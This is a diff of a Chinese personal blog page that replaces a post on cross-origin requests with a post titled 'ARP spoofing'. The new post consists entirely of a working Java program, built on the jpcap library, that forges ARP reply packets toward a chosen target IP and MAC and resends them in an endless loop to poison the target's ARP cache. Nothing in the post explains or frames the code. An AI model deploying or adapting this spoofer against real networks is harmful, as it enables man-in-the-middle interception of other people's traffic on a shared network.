@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="跨域请求">
+    <meta name="keywords" content="arp">
     <meta name="description" content="一个人几乎可以在任何他怀有无限热忱的事情上成功。——查尔斯·史考伯">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>跨域请求 | 艾茶叶蛋</title>
+    <title>arp欺骗 | 艾茶叶蛋</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -243,7 +243,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = '0f528e7d2fb41dce71c15e7568a23992f8aa30de1473368f9e2dedec43b8c66c';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误！');
@@ -256,12 +256,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">跨域请求</h1>
+                    <h1 class="description center-align post-title">arp欺骗</h1>
                 </div>
             </div>
         </div>
@@ -378,12 +378,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%89%8D%E7%AB%AF/">
-                                <span class="chip bg-color">前端</span>
-                            </a>
-                        
-                            <a href="/tags/%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/">
-                                <span class="chip bg-color">跨域请求</span>
+                            <a href="/tags/%E6%8A%80%E8%83%BD/">
+                                <span class="chip bg-color">-技能</span>
                             </a>
                         
                     </div>
@@ -394,8 +390,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/" class="post-category">
-                                常用方法
+                            <a href="/categories/%E7%BD%91%E7%BB%9C/" class="post-category">
+                                网络
                             </a>
                         
                     </div>
@@ -407,21 +403,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-15
+                    2020-09-14
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-04-15
+                    2020-09-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    119
+                    269
                 </div>
                 
 
@@ -444,24 +440,60 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="一、后端处理"><a href="#一、后端处理" class="headerlink" title="一、后端处理"></a>一、后端处理</h2><pre><code>public HttpServletResponse getResponse(Map&lt;String,Object&gt; map) throws IOException {
-        if (null == response) {
-            String respBody = JSON.toJSONString(map);
-            response = ServletActionContext.getResponse();
-            response.setContentType(SystemContext.ACTION_CONTENT_TYPE);
-            response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);
-            response.setHeader(&quot;Cache-Control&quot;, &quot;no-cache&quot;);
-            response.addHeader(&quot;Access-Control-Allow-Meaders&quot;,&quot;POST&quot;);//请求格式
-            response.addHeader(&quot;Access-Control-Allow-Headers&quot;,&quot;x-requested-with,content-type&quot;);//响应头
-            //PrintWriter out = response.getWriter();//输出流
-            //out.print(respBody);
-            //out.flush();
-            //out.close();
+                <pre><code>
+package com.test.arp;
+import java.net.InetAddress;
+import jpcap.JpcapCaptor;
+import jpcap.JpcapSender;
+import jpcap.NetworkInterface;
+import jpcap.packet.ARPPacket;
+import jpcap.packet.EthernetPacket;
+
+public class SendFakeARP {
+    static byte[] stomac(String s) {
+        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
+        String[] s1 = s.split(&quot;-&quot;);
+        for (int x = 0; x &lt; s1.length; x++) {
+            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) &amp; 0xff);
         }
-        return response;
-    }</code></pre><h2 id="二、调用方法"><a href="#二、调用方法" class="headerlink" title="二、调用方法"></a>二、调用方法</h2><pre><code>data = JsonBean.success(&quot;suceess&quot;,pageResult);
-BaseAction base = new BaseAction();
-base.getResponse(data);</code></pre>
+        return mac;
+    }
+    public static void main(String[] args) throws Exception {
+        int time = 2;  // 重发间隔时间
+        InetAddress desip = InetAddress.getByName(&quot;192.168.1.2&quot;);// 被欺骗的目标IP地址
+        byte[] desmac = stomac(&quot;01-1c-23-3c-51-cf&quot;);// 被欺骗的目标目标MAC数组
+        InetAddress srcip = InetAddress.getByName(&quot;192.168.1.3&quot;);// 源IP地址
+        byte[] srcmac = stomac(&quot;00-1C-13-2E-A8-0A&quot;); // 假的MAC数组
+        // 枚举网卡并打开设备
+        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
+        NetworkInterface device = devices[1];
+        JpcapSender sender = JpcapSender.openDevice(device);
+        // 设置ARP包
+        ARPPacket arp = new ARPPacket();
+        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
+        arp.prototype = ARPPacket.PROTOTYPE_IP;
+        arp.operation = ARPPacket.ARP_REPLY;
+        arp.hlen = 6;
+        arp.plen = 4;
+        arp.sender_hardaddr = srcmac;
+        arp.sender_protoaddr = srcip.getAddress();
+        arp.target_hardaddr = desmac;
+        arp.target_protoaddr = desip.getAddress();
+        // 设置DLC帧
+        EthernetPacket ether = new EthernetPacket();
+        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
+        ether.src_mac = srcmac;
+        ether.dst_mac = desmac;
+        arp.datalink = ether;
+        // 发送ARP应答包
+        while (true) {
+            System.out.println(&quot;sending arp..&quot;);
+            sender.sendPacket(arp);
+            Thread.sleep(time * 1000);
+        }
+    }
+}
+</code></pre>
             </div>
             <hr/>
 
@@ -486,7 +518,7 @@ base.getResponse(data);</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://scanele.cn/2020/04/15/kua-yu-qing-qiu/">http://scanele.cn/2020/04/15/kua-yu-qing-qiu/</a>
+                    <a href="http://scanele.cn/2020/09/14/arp-qi-pian/">http://scanele.cn/2020/09/14/arp-qi-pian/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -524,12 +556,8 @@ base.getResponse(data);</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%89%8D%E7%AB%AF/">
-                                    <span class="chip bg-color">前端</span>
-                                </a>
-                            
-                                <a href="/tags/%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/">
-                                    <span class="chip bg-color">跨域请求</span>
+                                <a href="/tags/%E6%8A%80%E8%83%BD/">
+                                    <span class="chip bg-color">-技能</span>
                                 </a>
                             
                         </div>
@@ -958,42 +986,48 @@ base.getResponse(data);</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/07/30/git-chang-yong-ming-ling/">
+                <a href="/2020/09/14/arp-qi-pian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="git常用命令">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="arp欺骗">
                         
-                        <span class="card-title">git常用命令</span>
+                        <span class="card-title">arp欺骗</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            git常用命令
+                            arp欺骗
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-30
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-14
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            艾茶叶蛋
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E7%BB%9C/" class="post-category">
+                                    网络
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/git/">
-                        <span class="chip bg-color">git</span>
+                    <a href="/tags/%E6%8A%80%E8%83%BD/">
+                        <span class="chip bg-color">-技能</span>
                     </a>
                     
                 </div>
@@ -1007,31 +1041,31 @@ base.getResponse(data);</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/04/15/tu-pian-shang-chuan/">
+                <a href="/2020/09/05/spring/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="图片上传">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="spring">
                         
-                        <span class="card-title">图片上传</span>
+                        <span class="card-title">spring</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            将图片上传至后台
+                            spring学习笔记
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-05
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/" class="post-category">
-                                    常用方法
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    笔记
                                 </a>
                             
                             
@@ -1041,16 +1075,8 @@ base.getResponse(data);</code></pre>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E4%B8%8A%E4%BC%A0/">
-                        <span class="chip bg-color">上传</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%89%8D%E7%AB%AF/">
-                        <span class="chip bg-color">前端</span>
-                    </a>
-                    
                     <a href="/tags/%E5%90%8E%E7%AB%AF/">
-                        <span class="chip bg-color">后端</span>
+                        <span class="chip bg-color">-后端</span>
                     </a>
                     
                 </div>
